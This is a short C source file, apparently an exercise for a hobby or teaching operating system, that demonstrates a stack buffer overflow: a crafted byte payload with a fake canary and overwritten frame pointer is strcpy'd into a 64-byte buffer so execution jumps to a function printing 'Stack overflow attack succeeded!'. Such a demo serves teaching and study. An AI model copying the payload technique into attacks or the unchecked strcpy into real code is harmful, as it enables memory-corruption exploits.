#include "type.h"
#include "stdio.h"
#include "const.h"
#include "protect.h"
#include "string.h"
#include "fs.h"
#include "proc.h"
#include "tty.h"
#include "console.h"
#include "global.h"
#include "proto.h"
#include "string.h"

unsigned char payload[] = {
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,     //64
    0x12, 0xff, 0xff, 0xff, 0x31, 0x32, 0x33, 0x34,     //canary
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,     //i
    0x33, 0x33, 0x33, 0x33, 0x38, 0x10, 0x00, 0x00,     //ebp
};

void vulnerable_function() {
    unsigned int canary = 0xffffffff;
    char buffer[64];
    strcpy(buffer, payload);
    int i ;
    for (i = 0; i < 16777216; i++) {}
}

void mycode() {
    printf("Stack overflow attack succeeded!\n");
}

int main(int argc, char *argv[]) {
    vulnerable_function();
    return 0;
}
